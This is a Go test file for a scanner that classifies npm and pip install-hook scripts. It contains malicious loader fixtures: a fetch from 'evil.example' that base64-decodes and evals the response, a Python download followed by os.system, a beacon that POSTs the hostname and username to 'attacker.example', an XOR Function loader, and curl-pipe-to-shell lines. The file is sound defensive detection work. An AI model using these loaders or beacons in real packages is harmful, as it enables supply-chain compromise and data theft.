package installscripts

import (
	"fmt"
	"strings"
	"testing"
)

// TestReferencedScripts_NpmShapes covers the local-script invocation forms
// the npm "bun" loader wave uses, plus the legit build-tool forms that must
// NOT be resolved (system bins, package-name CLIs).
func TestReferencedScripts_NpmShapes(t *testing.T) {
	cases := []struct {
		name string
		hook string
		want []string
	}{
		// Shai-Hulud / bun loader: preinstall runs a bundled JS file.
		{"node bare", "node setup_bun.js", []string{"setup_bun.js"}},
		{"node relative", "node ./scripts/setup_bun.js", []string{"scripts/setup_bun.js"}},
		{"node dot-dir", "node ./setup_bun.js", []string{"setup_bun.js"}},
		{"python", "python install.py", []string{"install.py"}},
		{"python3", "python3 ./tools/x.py", []string{"tools/x.py"}},
		{"sh script", "sh postinstall.sh", []string{"postinstall.sh"}},
		{"bash script", "bash ./run.sh", []string{"run.sh"}},
		{"ts-node", "ts-node ./loader.ts", []string{"loader.ts"}},
		{"direct exec", "./bootstrap.js", []string{"bootstrap.js"}},
		{"node with args", "node setup_bun.js --silent", []string{"setup_bun.js"}},
		{"chained &&", "node a.js && node b.js", []string{"a.js", "b.js"}},
		// `bun run index.js` — the real Shai-Hulud @antv preinstall shape.
		{"bun run", "bun run index.js", []string{"index.js"}},
		{"deno run", "deno run ./loader.ts", []string{"loader.ts"}},

		// MUST NOT resolve: these reference no bundled local file body.
		{"node-gyp", "node-gyp rebuild", nil},
		{"prebuild", "prebuild-install || node-gyp rebuild", nil},
		{"tsc", "tsc -p tsconfig.json", nil},
		{"husky", "husky install", nil},
		{"npm script", "npm run build", nil},
		{"absolute bin", "/usr/bin/node --version", nil},
		{"bare echo", "echo hello", nil},
		// node with a package-style module (no extension, not a path) — not a
		// bundled file we can resolve; don't emit it.
		{"node -e inline", "node -e \"console.log(1)\"", nil},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := ReferencedScripts(tc.hook)
			if !sameStrings(got, tc.want) {
				t.Fatalf("ReferencedScripts(%q) = %v, want %v", tc.hook, got, tc.want)
			}
		})
	}
}

// TestReferencedScripts_PyShapes covers pip setup.py invocation of a local
// helper module.
func TestReferencedScripts_PyShapes(t *testing.T) {
	got := ReferencedScripts("python3 ./_bootstrap.py && echo done")
	if !sameStrings(got, []string{"_bootstrap.py"}) {
		t.Fatalf("got %v", got)
	}
}

// TestScanReferencedBody_FetchDecodeExecFires asserts the body-level
// classifier escalates a bundled loader that fetches a remote blob and
// decode-evals it (download-and-execute coupling) to fetches_remote. This is
// the Shai-Hulud catch.
func TestScanReferencedBody_FetchDecodeExecFires(t *testing.T) {
	body := `
const https = require('https');
https.get('https://evil.example/c2', (res) => {
  let d = '';
  res.on('data', c => d += c);
  res.on('end', () => eval(Buffer.from(d, 'base64').toString()));
});
`
	k := ScanReferencedBody(body)
	if k != KindFetchesRemote {
		t.Fatalf("fetch+decode+eval body should be fetches_remote, got %q", k)
	}
}

// TestScanReferencedBody_ObfuscatedBlobFires asserts a javascript-obfuscator
// hex-identifier blob (the @antv wave shape) escalates even with no readable
// fetch primitive — obfuscation is dispositive.
func TestScanReferencedBody_ObfuscatedBlobFires(t *testing.T) {
	var b strings.Builder
	b.WriteString("const _0x192368=_0x2a3a;")
	for i := 0; i < 60; i++ {
		fmt.Fprintf(&b, "const _0x%06x=_0x192368(0x%x);", i*7+0x300, i)
	}
	k := ScanReferencedBody(b.String())
	if k != KindFetchesRemote {
		t.Fatalf("obfuscated hex-identifier blob should be fetches_remote, got %q", k)
	}
}

// TestScanReferencedBody_BinaryInstallerStaysClean is the critical FP guard:
// a legit native-addon installer (esbuild/node-sass/sharp shape) fetches a
// platform binary over https and shells out to a local toolchain, but never
// eval/decodes the fetched bytes. It must NOT escalate to fetches_remote.
func TestScanReferencedBody_BinaryInstallerStaysClean(t *testing.T) {
	body := `
const https = require('https');
const child_process = require('child_process');
function fetch(url) {
  return new Promise((resolve, reject) => {
    https.get(url, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve(Buffer.concat(chunks)));
    });
  });
}
async function main() {
  const bin = await fetch('https://registry.npmjs.org/pkg/-/pkg-1.0.0.tgz');
  require('fs').writeFileSync('./bin/tool', bin);
  child_process.execFileSync('node-gyp', ['rebuild'], { stdio: 'inherit' });
}
main();
`
	k := ScanReferencedBody(body)
	if k == KindFetchesRemote {
		t.Fatalf("benign binary installer (fetch-to-disk + run-binary) must NOT be fetches_remote, got %q", k)
	}
}

// TestScanReferencedBody_Base64EvalFires covers the obfuscated-loader form:
// a base64 blob decoded and eval'd.
func TestScanReferencedBody_Base64EvalFires(t *testing.T) {
	body := "eval(Buffer.from('Y29uc29sZS5sb2coMSk=','base64').toString());"
	k := ScanReferencedBody(body)
	if k == KindNone || k == KindPresent {
		t.Fatalf("base64+eval body should escalate, got %q", k)
	}
}

// TestScanReferencedBody_BenignBuildStaysClean is the FP-discipline anchor:
// a real build script that compiles but never fetch-and-execs a remote /
// obfuscated payload must classify as present (or none), never
// fetches_remote.
func TestScanReferencedBody_BenignBuildStaysClean(t *testing.T) {
	// A typical prebuild/gyp wrapper: spawns the local compiler toolchain,
	// no network, no eval, no base64 blob.
	body := `
const { execFileSync } = require('child_process');
execFileSync('node-gyp', ['rebuild'], { stdio: 'inherit' });
console.log('native build complete');
`
	k := ScanReferencedBody(body)
	if k == KindFetchesRemote {
		t.Fatalf("benign local-compile script must not be fetches_remote, got %q", k)
	}
}

// TestScanReferencedBody_BareAtobConfigStaysClean is the reviewer-confirmed
// CRITICAL FP guard: a benign install script that base64-DECODES an embedded
// config/token (no fetch, no exec of the decoded bytes) must NOT escalate.
// `atob(`/`Buffer.from(...,'base64')` alone is a decode, not a code-exec.
func TestScanReferencedBody_BareAtobConfigStaysClean(t *testing.T) {
	for _, body := range []string{
		`const cfg = JSON.parse(atob(process.env.PKG_DEFAULTS || 'e30='));
console.log('configured', cfg);`,
		`const seed = Buffer.from('aGVsbG8=', 'base64').toString();
require('fs').writeFileSync('./.cache/seed', seed);`,
	} {
		if k := ScanReferencedBody(body); k == KindFetchesRemote {
			t.Fatalf("bare base64-decode of config (no fetch, no exec-of-decode) must NOT be fetches_remote, got %q\nbody: %s", k, body)
		}
	}
}

// TestScanReferencedBody_FetchBinaryWithChecksumStaysClean is the reviewer's
// HIGH coupling FP: a legit installer that fetches a binary, SEPARATELY
// base64-decodes an integrity checksum, and execs the BINARY by path — the
// decode is not the exec argument, so it must NOT escalate.
func TestScanReferencedBody_FetchBinaryWithChecksumStaysClean(t *testing.T) {
	body := `
const https = require('https');
const { execFileSync } = require('child_process');
const crypto = require('crypto');
https.get('https://registry.example.com/pkg/tool-linux-x64', (res) => {
  const chunks = [];
  res.on('data', (c) => chunks.push(c));
  res.on('end', () => {
    const bin = Buffer.concat(chunks);
    const expected = Buffer.from('3q2+7w==', 'base64');               // checksum, decoded separately
    if (!crypto.timingSafeEqual(crypto.createHash('sha256').update(bin).digest(), expected)) process.exit(1);
    require('fs').writeFileSync('./bin/tool', bin, { mode: 0o755 });
    execFileSync('./bin/tool', ['--version'], { stdio: 'inherit' });   // execs the BINARY path, not the decode
  });
});
`
	if k := ScanReferencedBody(body); k == KindFetchesRemote {
		t.Fatalf("legit fetch-binary + separate checksum-decode + exec-binary-by-path must NOT be fetches_remote, got %q", k)
	}
}

// TestScanReferencedBody_PySubprocessFetchFires covers os.system / subprocess
// + remote download inside a referenced .py helper.
func TestScanReferencedBody_PySubprocessFetchFires(t *testing.T) {
	body := `
import urllib.request, os
urllib.request.urlretrieve('http://evil/x', '/tmp/x')
os.system('/tmp/x')
`
	k := ScanReferencedBody(body)
	if k != KindFetchesRemote {
		t.Fatalf("py download+os.system should be fetches_remote, got %q", k)
	}
}

func TestScanReferencedBody_DependencyMutationWarns(t *testing.T) {
	body := `
import fs from "fs";
import path from "path";

const projectRoot = process.cwd();
const sourcePath = path.join(projectRoot, "vendor", "fetch-page-assets", "index.js");
const targetPath = path.join(projectRoot, "node_modules", "fetch-page-assets", "index.js");
fs.copyFileSync(sourcePath, targetPath);
`
	if k := ScanReferencedBody(body); k != KindMutatesDependency {
		t.Fatalf("node_modules mutation should be mutates_dependency, got %q", k)
	}
}

func TestScanReferencedBody_KnownBuildToolsDoNotWarnAsDependencyMutation(t *testing.T) {
	for _, body := range []string{
		`require('child_process').execFileSync('node-gyp', ['rebuild']);`,
		`require('child_process').execFileSync('patch-package'); // patches node_modules intentionally`,
	} {
		if k := ScanReferencedBody(body); k == KindMutatesDependency || k == KindFetchesRemote {
			t.Fatalf("known build/patch tooling must not be dependency-mutation warning, got %q for %s", k, body)
		}
	}
}

func sameStrings(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

// TestScanReferencedBody_HostReconBeaconFires is the dependency-confusion
// beacon, trimmed from a 2025 Datadog sample (the host is redacted): the
// script a preinstall hook runs collects hostname and user and POSTs them. It
// evals nothing, so before 2026-10-03 it classified as KindPresent.
func TestScanReferencedBody_HostReconBeaconFires(t *testing.T) {
	body := `const os = require("os");
const https = require("https");
const trackingData = JSON.stringify({
    c: __dirname,
    hn: os.hostname(),
    un: os.userInfo().username,
});
var req = https.request({ hostname: "attacker.example", method: "POST" }, (res) => {});
req.write(trackingData);
req.end();`
	if got := ScanReferencedBody(body); got != KindFetchesRemote {
		t.Fatalf("recon beacon = %q, want %q", got, KindFetchesRemote)
	}
}

// TestScanReferencedBody_InstallerReadingHomeAndProxyStaysClean is the shape
// of a real binary installer (puppeteer, @sentry/cli, esbuild): it picks a
// cache directory under the home directory, reads proxy settings, works out
// the platform and downloads. None of that is recon of the user.
func TestScanReferencedBody_InstallerReadingHomeAndProxyStaysClean(t *testing.T) {
	body := `const os = require("os");
const https = require("https");
const path = require("path");
const cache = path.join(os.homedir(), ".cache", "tool");
const proxy = process.env.HTTPS_PROXY || process.env.npm_config_https_proxy;
const target = os.platform() + "-" + os.arch();
https.get("https://releases.example/tool-" + target + ".tar.gz", (res) => {
    res.pipe(require("fs").createWriteStream(path.join(cache, "tool.tgz")));
});`
	if got := ScanReferencedBody(body); got != KindPresent {
		t.Fatalf("binary installer = %q, want %q", got, KindPresent)
	}
}

// TestScanReferencedBody_TelemetryUsernameStaysClean is the @scarf/scarf
// postinstall shape: it reads the username and reports to its own analytics
// host, with an opt-out. os.userInfo is deliberately not recon (it warned on
// scarf 1.4.0 and 0.2.0 and bought 1 of 72 malware samples).
func TestScanReferencedBody_TelemetryUsernameStaysClean(t *testing.T) {
	body := `const os = require("os");
const https = require("https");
if (process.env.DO_NOT_TRACK === '1') { process.exit(0) }
const username = os.userInfo().username;
const req = https.request({ hostname: "telemetry.example", method: "POST" }, () => {});
req.write(JSON.stringify({ user: hash(username) }));
req.end();`
	if got := ScanReferencedBody(body); got != KindPresent {
		t.Fatalf("telemetry postinstall = %q, want %q", got, KindPresent)
	}
}

// xorLoader builds the @7nohe/openapi-react-query-codegen preinstall shape
// (`node 3FWCvzduYZg.js`, 6.4 MB in the wild): one enormous encoded string, an
// XOR decode loop over it, and the Function constructor on the result. No
// fetch, no eval(Buffer.from), no _0x identifiers — nothing the other arms see.
func xorLoader(payloadLen int) string {
	var b strings.Builder
	b.WriteString(`var k="s3cr3t";var d="`)
	for i := 0; i < payloadLen; i++ {
		b.WriteByte("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[i%62])
	}
	b.WriteString(`";var o="";for(var i=0;i<d.length;i++){o+=String.fromCharCode(d.charCodeAt(i)^k.charCodeAt(i%k.length))}Function(o)();`)
	return b.String()
}

func TestScanReferencedBody_LargeXorLoaderFlagged(t *testing.T) {
	if got := ScanReferencedBody(xorLoader(1200 * 1024)); got != KindFetchesRemote {
		t.Fatalf("1.2 MB XOR loader = %q, want %q", got, KindFetchesRemote)
	}
	// Under 1 MiB but carrying a >=64 KiB literal: still a loader.
	if got := ScanReferencedBody(xorLoader(70 * 1024)); got != KindFetchesRemote {
		t.Fatalf("70 KiB-literal XOR loader = %q, want %q", got, KindFetchesRemote)
	}
}

func TestScanReferencedBody_XorLoaderNeedsAllThree(t *testing.T) {
	// Small XOR + Function: no size, no huge literal.
	if got := ScanReferencedBody(xorLoader(1024)); got != KindPresent {
		t.Fatalf("small XOR loader = %q, want %q (size gate)", got, KindPresent)
	}
	big := xorLoader(1200 * 1024)
	if got := ScanReferencedBody(strings.Replace(big, "Function(o)()", "console.log(o)", 1)); got != KindPresent {
		t.Fatalf("no dynamic exec = %q, want %q", got, KindPresent)
	}
	if got := ScanReferencedBody(strings.Replace(big, "^k.charCodeAt", "+k.charCodeAt", 1)); got != KindPresent {
		t.Fatalf("no XOR decode = %q, want %q", got, KindPresent)
	}
}

// A normal >1 MiB webpack bundle: the global-object shim
// `new Function("return this")()`, String.fromCharCode in a UTF-8 decoder, and
// a CRC32 that XORs charCodeAt. All three ingredients appear, none of them is
// a decode-then-run.
//
// It asserts the XOR rule, not ScanReferencedBody: the pre-existing coupling
// arm already returns fetches_remote for ANY referenced body containing
// `new Function("...")` or `eval(`, because fetchesRemoteRE (its "fetch"
// half) itself matches `Function(` and `eval(`. That predates this rule.
func TestLooksXorLoader_WebpackBundleNotFlagged(t *testing.T) {
	var b strings.Builder
	b.WriteString(`(function(){var g;try{g=this||new Function("return this")()}catch(e){g=window}`)
	b.WriteString(`function crc32(s){var c=-1;for(var i=0;i<s.length;i++){c=(c>>>8)^T[(c^s.charCodeAt(i))&255]}return c^-1}`)
	b.WriteString(`function utf8(a){var s="";for(var i=0;i<a.length;i++){s+=String.fromCharCode(a[i]&127)}return s}`)
	for b.Len() < 1300*1024 {
		b.WriteString(`__webpack_require__.d(exports,{a:function(){return n}});var n=function(t,e){return t.map(function(r){return r+e})};`)
	}
	b.WriteString(`})();`)
	if looksXorLoader(b.String()) {
		t.Fatal("webpack bundle matched the XOR-loader rule")
	}
	// The same bundle with the shim's argument computed is still not a
	// loader: its fromCharCode carries no XOR.
	if looksXorLoader(strings.Replace(b.String(), `new Function("return this")`, `new Function(src)`, 1)) {
		t.Fatal("computed Function without an XOR decode matched the XOR-loader rule")
	}
	// A bundled string-keyed HMAC really does XOR into fromCharCode
	// (ipad/opad). Beside only the literal shim it is still not a loader.
	hmac := `function pad(key){var p="";for(var i=0;i<64;i++){p+=String.fromCharCode(key.charCodeAt(i)^54)}return p}`
	if looksXorLoader(hmac + b.String()) {
		t.Fatal("HMAC pad + literal Function shim matched the XOR-loader rule")
	}
}

// Since v0.22.106 (F11): fetch, then run a bundled script under bun/deno. The
// shapes are the keyv@6.0.0 / @bitwarden/cli 2026.4.0 / intercom-client@7.0.4
// loaders, including the one that hides the script name behind a decoder.
func TestScanReferencedBody_ForeignRuntimeLoaderFires(t *testing.T) {
	for name, body := range map[string]string{
		"execFile dir+/bun, __dirname arg": "https.get(u,r=>{r.pipe(w).on('finish',()=>{execFileSync(dir+'/bun',[path.join(__dirname,D(0))]);});});",
		"bun from PATH, literal script":    `https.get(u,cb);execFileSync("bun",[path.join(__dirname,"bw1.js")],{stdio:"inherit"})`,
		"path.join runtime":                "await fetch(u);spawnSync(path.join(dir,'bun'),['Math_Symbol.js']);",
		"template runtime, import.meta":    "execSync(`curl -fsSL ${url} -o /tmp/.b.zip`);execFileSync(`/tmp/.b/bun-${plat}-${arch}/bun`, [path.join(here, 'router_runtime.js')]);",
		"shell command line":               "#!/bin/bash\ncurl -fsSL https://dl.example.invalid/bun.zip -o /tmp/b.zip && unzip -oq /tmp/b.zip -d /tmp/b && /tmp/b/bun \"$(dirname \"$0\")/router_runtime.js\"\n",
		"bun run string":                   "require('child_process').execSync('curl -fsSL https://bun.example.invalid/install | bash && bun run setup_bun.js')",
		"deno with flags":                  "wget -q https://dl.example.invalid/deno.zip && ./deno run -A loader.ts",
		"shell line":                       "#!/usr/bin/env bash\ncurl -fsSL https://dl.example.invalid/b.zip -o b.zip\n/tmp/b/bun ./payload.js\n",
	} {
		if got := ScanReferencedBody(body); got != KindFetchesRemote {
			t.Errorf("%s: got %q, want fetches_remote", name, got)
		}
	}
}

// The look-alikes: a binary installer that checks the version of what it
// fetched, a bundler (the word "bun" inside an identifier), node running its
// own script, and a bun invocation with no fetch in the body.
func TestScanReferencedBody_ForeignRuntimeLookAlikesStayPresent(t *testing.T) {
	for name, body := range map[string]string{
		"bun version check":     `https.get(u,cb);const out=execFileSync(binPath,["--version"]);execFileSync("./bun",["--revision"]);`,
		"bundler identifier":    "https.get(u,cb);spawnSync(bundlerBin,[path.join(__dirname,'cfg.js')]);",
		"node runs own script":  "https.get(u,cb);spawnSync(process.execPath,[path.join(__dirname,'install.js')]);",
		"no fetch":              `execFileSync("bun",[path.join(__dirname,"build.js")]);`,
		"bun in prose":          "// works on node and bun; see install.js\nhttps.get(u,cb);",
		"esbuild validate":      "https.get(u,cb);child_process.execFileSync(command.shift(), command, {stdio:'pipe'});",
		"bun install subcomand": "https.get(u,cb);execSync('bun install --frozen-lockfile');",
		// Review LOW 7: free text, not an exec context.
		"message":       "https.get(u,cb);console.log('If you use Bun, run: bun run setup.ts');",
		"comment":       "// works with bun scripts/postinstall.js\nhttps.get(u,cb);",
		"shell comment": "#!/bin/sh\ncurl -fsSL https://x.example.invalid/a -o a\n# then: bun run setup.ts\n",
	} {
		if got := ScanReferencedBody(body); got == KindFetchesRemote {
			t.Errorf("%s: escalated to fetches_remote", name)
		}
	}
}

func TestNextHopScripts_DirJoinLiteral(t *testing.T) {
	got := NextHopScripts(`execFileSync('bun',[__dirname+'/Math_Symbol.js']);exec('bash '.escapeshellarg(dirname(__DIR__).'/setup-intercom.sh'));`)
	if strings.Join(got, ",") != "Math_Symbol.js,setup-intercom.sh" {
		t.Fatalf("NextHopScripts = %v", got)
	}
}
